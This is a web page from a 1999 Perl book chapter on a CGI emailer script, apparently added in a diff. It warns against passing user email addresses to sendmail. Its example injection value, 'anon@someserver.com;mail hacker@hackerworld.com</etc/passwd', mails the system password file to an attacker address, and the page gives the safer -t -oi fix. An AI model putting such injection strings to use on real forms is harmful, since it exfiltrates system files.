@@ -1,0 +1,591 @@
+<HTML>
+<HEAD>
+<META name=vsisbn content="1576104265">
+<META name=vstitle content="Perl Core Language Little Black Book">
+<META name=vsauthor content="Steven Holzner">
+<META name=vspublisher content="The Coriolis Group">
+<META name=vspubdate content="03/01/99">
+<META name=vscategory content="Web and Software Development: Open Source Development: Languages: Perl,Web and Software Development: Programming, Scripting, and Markup Languages: Perl">
+
+
+
+
+
+<TITLE>Perl Core Language Little Black Book:CGI: Web Counters, Guest Books, Emailers, And Secure Scripts</TITLE>
+
+<!-- HEADER -->
+
+<STYLE type="text/css"> 
+ <!--
+ A:hover  {
+ 	color : Red;
+ }
+ -->
+</STYLE>
+
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<script>
+<!--
+function displayWindow(url, width, height) {
+         var Win = window.open(url,"displayWindow",'width=' + width +',height=' + height + ',resizable=1,scrollbars=yes');
+	if (Win) {
+		Win.focus();
+	}
+}
+//-->
+</script>
+<SCRIPT>
+<!--
+function popUp(url) {
+        var Win = window.open(url,"displayWindow",'width=400,height=300,resizable=1,scrollbars=yes');
+	if (Win) {
+		Win.focus();
+	}
+}
+//-->
+</SCRIPT>
+
+<script language="JavaScript1.2">
+<!--
+function checkForQuery(fm) {
+  /* get the query value */
+  var i = escape(fm.query.value);
+  if (i == "") {
+      alert('Please enter a search word or phrase');
+      return false;
+  }                  /* query is blank, dont run the .jsp file */
+  else return true;  /* execute the .jsp file */
+}
+//-->
+</script>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+var axel = Math.random() + "";
+var ord = axel * 1000000000000000000 + "?";
+
+//This part of script alleviates a Netscape document.write bug
+<!-- 
+NS4 = document.layers;
+if (NS4) {
+origWidth = innerWidth;
+origHeight = innerHeight;
+}
+function reDo() {
+if (innerWidth != origWidth || innerHeight != origHeight) 
+location.reload();
+}
+if (NS4) onresize = reDo;
+//-->
+</SCRIPT> 
+</HEAD>
+
+<body background="/images/back.jpg" bgcolor="#FFFFFF" link="#003399" alink="#FF0000" vlink="#003399" topmargin=0 leftmargin=0 marginheight=0 marginwidth=0>
+
+<table bgcolor="#003366" width="100%" border="0" cellpadding="0" cellspacing="0">
+	<tr valign="top">
+		<td height="95">
+		&nbsp;&nbsp;<a href="http://www.earthweb.com" target="resource window"><img src="/images/ew_logo.jpg" width="82" height="58" alt="EarthWeb" border="0"></a>&nbsp;&nbsp;&nbsp;</td>
+		<td height=95">
+		<table width="100%">
+			<tr valign="top">
+			<td bgcolor="#003366" nowrap>
+<SCRIPT LANGUAGE="javascript">
+<!--
+document.write('<NOLAYER>');
+document.write('<IFRAME SRC="http://ad.doubleclick.net/adi/itk.earthweb.dart/b_soft_dev;a=b_soft_dev1;sz=468x60;ord=' + ord + '" width="468" height="60" frameborder="no" border="0" MARGINWIDTH="0" MARGINHEIGHT="0" SCROLLING="no">');
+document.write('<A HREF="http://ad.doubleclick.net/jump/itk.earthweb.dart/b_soft_dev;abr=!ie;a=b_soft_dev1;sz=468x60;ord=' + ord + '" target="_top"><IMG SRC="http://ad.doubleclick.net/ad/itk.earthweb.dart/b_soft_dev;abr=!ie;a=b_soft_dev1;sz=468x60;ord=' + ord + '" border=0 height="60" width="468"></A>');
+document.write('</IFRAME>');
+document.write('</NOLAYER>');
+document.write('<ILAYER id="layer1" visibility="hidden" width=468 height=60></ILAYER>');
+//-->
+</SCRIPT>
+			</td>
+			<td bgcolor="#003366" nowrap>
+<SCRIPT LANGUAGE="javascript">
+<!--
+document.write('<NOLAYER>');
+document.write('<IFRAME SRC="http://ad.doubleclick.net/adi/itk.earthweb.dart/b_soft_dev;a=b_soft_dev4;sz=160x60;ord=' + ord + '" width="160" height="60" frameborder="no" border="0" MARGINWIDTH="0" MARGINHEIGHT="0" SCROLLING="no">');
+document.write('<A HREF="http://ad.doubleclick.net/jump/itk.earthweb.dart/b_soft_dev;abr=!ie;a=b_soft_dev4;sz=160x60;ord=' + ord + '" target="_top"><IMG SRC="http://ad.doubleclick.net/ad/itk.earthweb.dart/b_soft_dev;abr=!ie;a=b_soft_dev4;sz=160x60;ord=' + ord + '" border=0 height="60" width="160"></A>');
+document.write('</IFRAME>');
+document.write('</NOLAYER>');
+document.write('<ILAYER id="layer4" visibility="hidden" width=160 height=60></ILAYER>');
+//-->
+</SCRIPT>
+			</td>
+			<td bgcolor="#003366" nowrap><a href="ITKN1a2b3c4d5e6f7g8h9idefcon4.html"><img src="/images/dotclear.gif" border="0" height="1" width="1" align="left"></a></td>
+			</tr></table><br></td>
+	</tr>
+		
+<!-- 	<tr>
+		<td height="1" colspan="3" bgcolor="#003366"><img src="/images/dotclear.gif" border=0 alt=""></td>
+	</tr> -->
+</table>
+
+<!-- END HEADER -->
+
+
+<!-- BEGIN SUB HEADER -->
+
+<table bgcolor="#003366" cellpadding="0" cellspacing="0" border="0" width="100%">
+
+<!-- ITK TOPNAV -->
+	
+	<tr>
+		<td align="left" valign="top" nowrap><a href="/index2.html"><img src="/images/top_tabs/home_off.gif" alt="Home" border="0"></a><a href="/pick-account.html"><img src="/images/top_tabs/accountinfo.gif" alt="Account Info" border="0"></a><!--<a href="/PSUser/usrreg.htm?AdminAction=InitAdd&Locale=en&URI=/"><img src="/images/top_tabs/subscribe.gif" alt="Subscribe" border="0"></a>--><a href="/PSUser/psuserauth.htm?cmd=login&URI=/"><img src="/images/top_tabs/login.gif" alt="Login" border="0"></a><a href="/search/"><img src="/images/top_tabs/search.gif" alt="Search" border="0"></a><a href="/PSUser/EWIPOMain.html"><img src="/images/top_tabs/my_itknowledge.gif" alt="My ITKnowledge" border="0"></a><a href="/faq/faq.html"><img src="/images/top_tabs/faq.gif" alt="FAQ" border="0"></a><a href="/sitemap.html"><img src="/images/top_tabs/sitemap.gif" alt="Sitemap" border="0"></a><a href="/contactus.html"><img src="/images/top_tabs/contact_us.gif" alt="Contact Us" border="0"></a></td> 
+	</tr>
+	
+<!-- END of ITK TOPNAV -->
+
+<!-- ITK LOGO and newsletter sign up -->
+
+</table>
+	
+<table cellpadding="0" cellspacing="0" border="0" width="100%">
+
+	<tr>
+		<td align="left" valign="top" nowrap><img src="/images/itk_logo_sm.jpg" alt="" border="0"></td>
+		<td align="right"><font face="verdana, sans-serif" size="1">
+
+<script language="JavaScript">
+<!-- 
+
+var days = new Array(8);
+days[1] = "Sunday";
+days[2] = "Monday";
+days[3] = "Tuesday";
+days[4] = "Wednesday";
+days[5] = "Thursday";
+days[6] = "Friday";
+days[7] = "Saturday";
+
+var months = new Array(13);
+months[1] = "January";
+months[2] = "February";
+months[3] = "March";
+months[4] = "April";
+months[5] = "May";
+months[6] = "June";
+months[7] = "July";
+months[8] = "August";
+months[9] = "September";
+months[10] = "October";
+months[11] = "November";
+months[12] = "December";
+
+var dateObj = new Date()
+var wday = days[dateObj.getDay() + 1]
+var lmonth = months[dateObj.getMonth() + 1]
+var date = dateObj.getDate()
+var fyear = dateObj.getYear()
+if (fyear <1000) fyear += 1900;
+document.write(wday + ", " + lmonth + " " + date + ", " + fyear)
+                
+//-->
+</script>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font>
+<br><br>
+
+
+		 </td>
+	</tr>
+	</table>
+
+<!-- END ITK LOGO and newsletter sign up-->
+	
+<!-- begin of ITK left NAV -->
+
+<!-- BEGIN LEFT NAVBAR -->
+
+<!-- BEGIN LEFT NAVBAR -->
+
+	<table border="0" cellpadding="0" cellspacing="0">
+	
+	
+		<tr>
+		<td width="145" valign="top" align="left" rowspan=8>
+		
+	<!-- KEYWORD SEARCH -->	
+<script language="JavaScript1.2">
+<!--
+function checkForQuery(fm) {
+  /* get the query value */
+  var i = escape(fm.query.value);
+  if (i == "") {
+      alert('Please enter a search word or phrase');
+      return false;
+  }                  /* query is blank, dont run the .jsp file */
+  else return true;  /* execute the .jsp file */
+}
+//-->
+</script>
+	
+	
+	<form name="keyword" method="POST" action="http://ewsearch.earthweb.com:80/jsp/k2search/ewkwk2search_p2.jsp" onSubmit=" return checkForQuery(this); ">
+<img src="/images/keyword_searcha.gif" vspace="5" width="145" alt="" border="0">
+<INPUT type="hidden" name="collection" value="corpitk_p2">
+<INPUT type="hidden" name="altcoll" value="allbooks_p2">
+<INPUT type="hidden" name="topics" value="itk_www">
+<INPUT type="hidden" name="hl" value="off">
+<INPUT name="sortspec" type=hidden value="vspubdate desc score desc">
+<INPUT name=fields type=hidden value="vdkvgwkey score vstitle vsauthor vsisbn vspublisher vspubdate">		
+<INPUT name=imageprefix type=hidden value="http://www.itknowledge.com">
+<INPUT name=ssiFolder type=hidden value="itk">
+		
+		<table width="145" border="0" cellpadding="0" cellspacing="0">
+		<tr>
+		<td width="145">&nbsp;&nbsp;<input type="text" name="query" value="" size="11">&nbsp;<input type="image" width=28 height=23 border=0 value="Go" name="Go" src="/images/go.gif" align=absmiddle><br>
+&nbsp;&nbsp;<INPUT type="radio" name="scope" value="" checked><FONT face="arial, helvetica" size="1" color="#ffffff" size="1">All ITKnowledge</FONT><br>
+&nbsp;&nbsp;<INPUT type="radio" name="scope" value="sourcecode"><FONT face="arial, helvetica" size="1" color="#ffffff" size="1">Source Code</FONT><br>
+			<font face="arial, helvetica" size="2">
+			<img src="/images/dotclear.gif" width="1" height="5" alt="" border="0"><br>
+			
+			&nbsp;&nbsp;<a href="/search/search-tips.html"><img src="/images/arrows_blue.gif" alt="" border="0"><font size="1" color="#ffffff">Search Tips</font></a><br>
+			&nbsp;&nbsp;<a href="/search/"><img src="/images/arrows_blue.gif" alt="" border="0"><font size="1" color="#ffffff">Advanced Search</font></a><br>
+			
+			</font>
+			
+		</td>
+		<td width="5"><img src="/images/dotclear.gif" width=5 height=10 hspace="5" alt="" border="0"></td>
+		</tr>
+		</table>
+	</form>
+		
+		
+<!-- BROWSE BY TOPIC -->
+		
+
+<form name="meta" method="POST" action="http://ewsearch.earthweb.com:80/jsp/k2search/ewmetak2search_p2.jsp" onSubmit=" return checkForQuery(this); ">
+<img src="/images/publication_searcha.gif" width="145" alt="" border="0">
+<INPUT type="hidden" name="collection" value="allbooks_p2">
+<INPUT type="hidden" name="altcoll" value="corpitk_p2">
+<INPUT type="hidden" name="topics" value="itk_www">
+<INPUT type="hidden" name="hl" value="off">
+<INPUT name="sortspec" type=hidden value="vspubdate desc score desc">
+<INPUT name=fields type=hidden value="vdkvgwkey score vstitle vsauthor vspublisher vspubdate">
+<INPUT name=imageprefix type=hidden value="http://www.itknowledge.com">
+<INPUT name=ssiFolder type=hidden value="itk">
+		
+<table width="145" border="0" cellpadding="0" cellspacing="0">
+	
+			<tr>
+			<td valign="top">
+			&nbsp;&nbsp;<input type="text" name="query" value="" size="11">&nbsp;<input type="image" width=28 height=23 border=0 value="Go" name="Go" src="/images/go.gif" align=absmiddle><br><font face="arial, helvetica" size="2">
+			&nbsp;&nbsp;<SELECT NAME="metatags" style="font-size: 12; font-family: sans-serif;" size="1">
+			<option value="vstitle" SELECTED>Title
+			<option value="vsauthor">Author
+			<option value="vspublisher">Publisher
+			<option value="vsisbn">ISBN			
+			</SELECT><br><br></font>
+			</td>
+			</tr>
+</table>
+</form>
+
+<form action="" name="catlist">	
+<table width="145" border="0" cellpadding="0" cellspacing="0">				
+			<tr>
+			<td valign="top">
+			<img src="/images/jump_topica.gif" width="145" alt="" border="0">
+			</td>
+			</tr>
+			<tr>
+			<td width="145">
+				
+	        	<font face="Arial,helvetica" size="1">
+				&nbsp;&nbsp;<SELECT NAME="cat" onChange='top.location.href=this.options[selectedIndex].value;' style="font-size: 10; font-family: sans-serif;">
+                        <option value="" selected>Please Select
+                        <option value="">-----------
+						<option value="/reference/dir.1-busman.html">Business &amp; IT Mgmt
+						<option value="/reference/dir.2-certification.html">Certification &amp; Training                       
+						<option value="/reference/dir.3-databaseanderp.html">Database &amp; ERP
+                        <option value="/reference/dir.4-desktopapps.html">Desktop Apps
+                        <option value="/reference/dir.5-desktoppubanddesign.html">Graphic Design
+                        <option value="/reference/dir.6-generalinternet.html">General Internet
+                        <option value="/reference/dir.7-hardwareandos.html">Hardware &amp; OS
+                        <option value="/reference/dir.8-ibmredbooks.html">IBM RedBooks
+                        <option value="/reference/dir.9-networktelcom.html">Network &amp; Telecom
+						<option value="/reference/dir.10-websoftwaredev.html">Web &amp; Software Dev
+                        <option value="">-----------
+
+                        <option value="/reference/dir.archive1.html">Public Archive               
+                        </SELECT>
+			</font>
+			
+		</td>
+		</tr>
+	</table>
+	</form>
+	
+<!-- LEFT NAV SEARCH END -->
+
+	</td>
+		
+
+<!-- END LEFT NAVBAR -->
+
+
+<!-- END LEFT NAVBAR -->
+	
+	<td width="15"><img src="/images/dotclear.gif" width="15" alt="" border="0"></td>
+
+<!-- end of ITK left NAV -->
+
+<!-- begin main content -->
+	
+	<td width="100%" valign="top" align="left">
+		<br>
+
+<!-- END SUB HEADER -->
+<!-- Created by dB Page Builder.  http://www.pchelponline.com/bluestem -->
+
+<!--Begin Content Column -->
+
+<TABLE border=0 cellspacing=0 cellpadding=0>
+<tr>
+<td width=75 valign=top>
+<img src="/images/sm_covers/1576104265.gif" width=60 height=73 alt="Perl Core Language Little Black Book" border="1">
+</td>
+<td align="left">
+    <font face="arial, helvetica" size="-1" color="#336633"><b>Perl Core Language Little Black Book</b></font>
+    <br>
+    <font face="arial, helvetica" size="-1"><i>by Steven Holzner</i>
+    <br>
+    The Coriolis Group
+    <br>
+    <b>ISBN:</b>&nbsp;1576104265<b>&nbsp;&nbsp;&nbsp;Pub Date:</b>&nbsp;03/01/99</font>&nbsp;&nbsp;<A HREF="http://www.digitalguru.com/dgstore/product.asp?isbn=1576104265&ac%5Fid=28" TARGET="anotherwindows"><img src="/images/buyit.gif" width=64 height=23 hspace="5" align="middle" alt="Buy It" border="0"></a><a href="/PSUser/EWBookMarks.html?url=http://www.itknowledge.com/reference/standard/1576104265/ewtoc.html&isbn=1576104265"><img src="/images/bookmarkit.gif" border=0 align="middle" alt="Bookmark It" width=97 height=23></a>
+</td>
+</tr>
+</table>
+<P>
+<FORM name= "search2" method="POST" action="http://ewsearch.earthweb.com:80/jsp/k2search/ewintrak2search_p2.jsp" onSubmit=" return checkForQuery(this); ">
+<INPUT type="hidden" name="collection" value="corpitk_p2">
+<INPUT type="hidden" name="altcoll" value="allbooks_p2">
+<INPUT type="hidden" name="hl" value="off">
+<INPUT name="sortspec" type=hidden value="score desc">
+<INPUT name="fields" type=hidden value="vdkvgwkey score vstitle vsisbn vsauthor vspublisher vspubdate">
+<INPUT name="imageprefix" type=hidden value="http://www.itknowledge.com">
+<INPUT name="ssiFolder" type=hidden value="itk">
+<INPUT name="topics" type=hidden value="itk_www">
+<INPUT type="hidden" name="bookid" value="t_1576104265">
+<font face="arial, helvetica" size=2><b>Search this book:</b></font><br>
+<INPUT NAME="query" size=25 VALUE="">&nbsp;<input type="image" width=28 height=23 border=0 value="Go" name="Go" src="/images/go.gif" align=absmiddle>
+
+</form>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=1576104265//-->
+<!--TITLE=Perl Core Language Little Black Book//-->
+<!--AUTHOR=Steven Holzner//-->
+<!--PUBLISHER=The Coriolis Group//-->
+<!--CHAPTER=20//-->
+<!--PAGES=446-448//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch21/21-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Also, of course, be sure that you place the address you want email to be sent to in the To: field in email.cgi (don&#146;t forget to escape the @ as \@ in the <B>HERE</B> document, as shown; email.cgi itself takes care of that for the sender&#146;s email address, which is stored in <B>$from</B>):</P>
+<!-- CODE SNIP //-->
+<PRE>
+open(MAIL, &#145;| /usr/lib/sendmail -t -oi&#146;);
+print MAIL &lt&ltEOF;
+To: steve\@yourserver.com
+From: $from
+Subject: $subject
+$text
+EOF
+close MAIL;
+</PRE>
+<!-- END CODE SNIP //-->
+<I><BLOCKQUOTE>
+<P><FONT SIZE="-1"><HR><B>TIP:&nbsp;&nbsp;</B>The email.cgi script removes HTML tags from the mail sent to you with this line of code: <B>$text =~ s/&lt/&amplt/</B> because many people use Web browsers to read mail, and HTML tags in your email can redirect your browser or create other annoying effects. If this is too paranoid for you, just remove that line of code.</I>
+</FONT><HR>
+</BLOCKQUOTE>
+<P>One serious security hole that emailer scripts are susceptible to is plugged into email.cgi. When you open a pipe to the sendmail program, you shouldn&#146;t pass the email address given to you by users directly to the sendmail program like this, as many such scripts do:
+</P>
+<!-- CODE SNIP //-->
+<PRE>
+open (MAIL,&#147;| /usr/lib/sendmail $emailaddress&#148;);
+</PRE>
+<!-- END CODE SNIP //-->
+<P>The security hole here is that the user may place metacharacters in the email address that could cause the pipe to do more than you want. For example, if the user passes this as an email address
+</P>
+<!-- CODE SNIP //-->
+<PRE>
+anon@someserver.com;mail hacker@hackerworld.com&lt/etc/passwd;
+</PRE>
+<!-- END CODE SNIP //-->
+<P>then the open statement will actually evaluate this statement:
+</P>
+<!-- CODE SNIP //-->
+<PRE>
+/usr/lib/sendmail anon@someserver.com; mail
+    hacker@hackerworld.com&lt/etc/passwd
+</PRE>
+<!-- END CODE SNIP //-->
+<P>This mails the system password file to <B>hacker@hackerworld.com,</B> which is probably not what you wanted to do. The way to get around this is to open the pipe this way, using the <B>-t</B> switch instead of passing an email address:</P>
+<!-- CODE SNIP //-->
+<PRE>
+open(MAIL, &#145;| /usr/lib/sendmail -t -oi&#146;);
+print MAIL &lt&ltEOF;
+To: steve\@yourserver.com
+From: $from
+Subject: $subject
+$text
+EOF
+close MAIL;
+</PRE>
+<!-- END CODE SNIP //-->
+<P>The <B>-t</B> switch tells sendmail to take the address to send the email to directly from the To: field passed to it. (The <B>-oi</B> switch tells sendmail not to terminate and send the email if it finds a line that begins with a period&#151;in the old days, email commands, which started with a period, could be directly embedded in email messages.) In fact, this isn&#146;t an issue in email.cgi as it stands because it&#146;s set up to read your email address directly from its own code.</P>
+<P>The script email.cgi is written this way in case you want to modify it to let the user specify the email address to send email to&#151;in which case, be careful because people might exploit the resulting application to send semianonymous email from your Web site. The email is <I>semianonymous</I> because the user can set the From: field themselves. Although the recipient can easily determine that it came from your ISP by checking the email message&#146;s headers, all he or she will be able to find directly for the actual sender&#146;s name&#151;besides the one in the From: field&#151;is <B>nobody@localhost.</B> Your ISP will be able to trace it back to you, though, if it comes to that, using the message ID.</P>
+<P><B><I>Listing 20.5</B> email.htm.</I></P>
+<!-- CODE //-->
+<PRE>
+&ltHTML&gt
+&ltHEAD&gt
+&ltTITLE&gtSend me some email&lt/TITLE&gt
+&lt/HEAD&gt
+&ltBODY BGCOLOR=&#147;white&#148; LINK=&#147;red&#148;&gt
+&ltCENTER&gt&ltH1&gtSend me some email!&lt/H1&gt&lt/CENTER&gt
+&ltHR&gt&ltFORM METHOD=&#147;POST&#148;
+ACTION=&#147;&lthttp://www.yourserver.com/username/cgi/email.cgi&gt&#148;
+ENCTYPE=&#147;application/x-www-form-urlencoded&#148;&gt
+Please enter your email address:
+&ltINPUT TYPE=&#147;text&#148; NAME=&#147;name&#148; VALUE=&#147;&#148;&gt&ltP&gt
+Please enter the email&#146;s subject:
+&ltINPUT TYPE=&#147;text&#148; NAME=&#147;subject&#148; VALUE=&#147;&#148;&gt&ltP&gt
+Please enter the email you want to send: &ltP&gt
+&ltTEXTAREA NAME=&#147;text&#148;
+ROWS=10 COLS=60&gtDear you:&lt/TEXTAREA&gt&ltP&gt
+&ltCENTER&gt
+&ltINPUT TYPE=&#147;submit&#148; NAME=&#147;submit&#148; VALUE=&#147;Send email&#148;&gt
+&ltINPUT TYPE=&#147;reset&#148;&gt
+&lt/CENTER&gt
+&ltHR&gt
+&lt/FORM&gt
+&lt/BODY&gt
+&lt/HTML&gt
+</PRE>
+<!-- END CODE //-->
+<P><B><I>Listing 20.6</B> email.cgi.</I></P>
+<!-- CODE //-->
+<PRE>
+#!/usr/bin/perl
+use CGI;
+
+$co = new CGI;
+
+print $co-&gtheader,
+
+$co-&gtstart_html(
+    -title=&gt&#145;Email Example&#146;,
+    -author=&gt&#145;Steve&#146;,
+    -BGCOLOR=&gt&#145;white&#146;,
+    -LINK=&gt&#145;red&#146;
+);
+
+if ($co-&gtparam()) {
+    $from = $co-&gtparam(&#145;name&#146;);
+    $from =~ s/@/\@/;
+    $subject = $co-&gtparam(&#145;subject&#146;);
+    $text = $co-&gtparam(&#145;text&#146;);
+    $text =~ s/&lt/&amplt/;
+    open(MAIL, &#145;| /usr/lib/sendmail -t -oi&#146;);
+    print MAIL &lt&ltEOF;
+To: steve\@yourserver.com
+From: $from
+Subject: $subject
+$text
+EOF
+close MAIL;
+}
+print
+$co-&gtcenter($co-&gth1(&#145;Thanks for sending me email!&#146;)),
+$co-&gthr,
+$co-&gtend_html;
+</PRE>
+<!-- END CODE //-->
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch21/21-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+<hr width="90%" size="1" noshade>
+<div align="center">
+<font face="Verdana,sans-serif" size="1">Copyright &copy; <a href="/reference/tcg00001.html">The Coriolis Group, Inc.</a></font>
+</div>
+<!-- all of the reference materials (books) have the footer and subfoot reveresed -->
+<!-- reference_subfoot = footer -->
+<!-- reference_footer = subfoot -->
+
+<!-- BEGIN SUB FOOTER -->
+	<br>
+	<img src="/images/dotclear.gif" width="5" height="7" border="0">
+	</TD>
+    </TR>
+	</TABLE>
+	
+	<table width="100%" border=0 cellpadding=0 cellspacing=0>
+	<tr>
+		<td align="left" width="160"><img src="/images/bot_curve.jpg" width="160" alt="" border="0"></td>
+		<td align="left" valign="top" nowrap><a href="/index2.html"><img src="/images/top_tabs/home_bot.gif" alt="Home" border="0"></a><a href="/pick-account.html"><img src="/images/top_tabs/account_info_bot.gif" alt="Account Info" border="0"></a><a href="/PSUser/usrreg.htm?AdminAction=InitAdd&Locale=en&URI=/"><img src="/images/top_tabs/subscribe_bot.gif" alt="Subscribe" border="0"></a><a href="/PSUser/psuserauth.htm?cmd=login&URI=/"><img src="/images/top_tabs/login_bot.gif" alt="Login" border="0"></a><a href="/search/"><img src="/images/top_tabs/search_bot.gif" alt="Search" border="0"></a><a href="/PSUser/EWIPOMain.html"><img src="/images/top_tabs/my_itknowledge_bot.gif" alt="My ITKnowledge" border="0"></a><a href="/faq/faq.html"><img src="/images/top_tabs/faq_bot.gif" alt="FAQ" border="0"></a><a href="/sitemap.html"><img src="/images/top_tabs/sitemap_bot.gif" alt="Sitemap" border="0"></a><a href="/contactus.html"><img src="/images/top_tabs/contact_us_bot.gif" alt="Contact Us" border="0"></a></td> 
+	</tr>
+	</table>
+		
+	<table width="100%" bgcolor="#003366" border=0 cellpadding=0 cellspacing=0>
+	<tr>
+		<td align="left" width=145><img src="/images/clear_pixel.gif" width=145 height="1" alt="" border="0"></td>
+				
+<!-- END SUB FOOTER -->
+
+<!-- all of the books have the footer and subfoot reveresed -->
+<!-- reference_subfoot = footer -->
+<!-- reference_footer = subfoot -->
+
+<!-- FOOTER -->
+			
+<td align="left" bgcolor="#003366">
+<table border="0" cellspacing="10" cellpadding="5">
+<tr>
+<td align="center">
+<font face="arial, helvetica" size="1" color="#cccccc"><b><a href="/products.html"><font color="#0099CC">Products</font></a>&nbsp;|&nbsp; <a href="/contactus.html"><font color="#0099CC">Contact Us</font></a>&nbsp;|&nbsp; <a href="http://www.earthweb.com/dlink.corp|about_us-jhtml.72.0.-.0.jhtml" target="resource window"><font color="#0099CC">About Us</font></a>&nbsp;|&nbsp; <a href="http://www.earthweb.com/dlink.corp|privacy-jhtml.72.0.-.-.jhtml" target="resource window"><font color="#0099CC">Privacy</font></a> &nbsp;|&nbsp; <a href="http://www.itmarketer.com/" target="resource window"><font color="#0099CC">Ad Info</font></a> &nbsp;|&nbsp; <a href="/index2.html"><font color="#0099CC">Home</font></a></b>
+<br><br>Use of this site is subject to certain <a href="/agreement.html"><font color="#0099CC">Terms &amp; Conditions</font></a>, <a href="/copyright.html"><font color="#0099CC">Copyright &copy; 1996-2000 EarthWeb Inc.</font></a> All rights reserved.  Reproduction in whole or in part in any form or medium without express written <a href="http://www.earthweb.com/dlink.corp|permissions-jhtml.72.0.-.-.jhtml" target="resource window"><font color="#0099CC">permission</font></a> of EarthWeb is prohibited. Read EarthWeb's <A HREF="http://www.earthweb.com/dlink.corp|privacy-jhtml.72.0.-.-.jhtml" target="resource window"><font color="#0099CC">privacy</font></A> statement.</font><br><br>
+</td>
+</tr>
+</table>
+
+<!-- netranger link to stop spiders -->
+
+<a href="ITKN1a2b3c4d5e6f7g8h9idefcon4.html">
+<img src="/images/dotclear.gif" border="0" height="1" width="1" align="left"></a>
+</td>
+		</tr>
+</table>
+<SCRIPT LANGUAGE="javascript">
+<!--
+document.write('<LAYER SRC="http://ad.doubleclick.net/adl/itk.earthweb.dart/b_soft_dev;a=b_soft_dev1;sz=468x60;ord=' + ord + '" width=468 height=60 visibility="hidden" onLoad="moveToAbsolute(layer1.pageX,layer1.pageY);clip.height=60;clip.width=468; visibility=\'show\';"></LAYER>');
+document.write('<LAYER SRC="http://ad.doubleclick.net/adl/itk.earthweb.dart/b_soft_dev;a=b_soft_dev4;sz=160x60;ord=' + ord + '" width=160 height=60 visibility="hidden" onLoad="moveToAbsolute(layer4.pageX,layer4.pageY);clip.height=60;clip.width=160; visibility=\'show\';"></LAYER>');
+document.write('<LAYER SRC="http://ad.doubleclick.net/adl/itk.earthweb.dart/b_soft_dev;a=b_soft_dev3;sz=125x125;ord=' + ord + '" width=125 height=125 visibility="hidden" onLoad="moveToAbsolute(layer3.pageX,layer3.pageY);clip.height=125;clip.width=125; visibility=\'show\';"></LAYER>');
+//-->
+</SCRIPT>
+</BODY>
+</HTML>
+
+<!-- END FOOTER -->
+
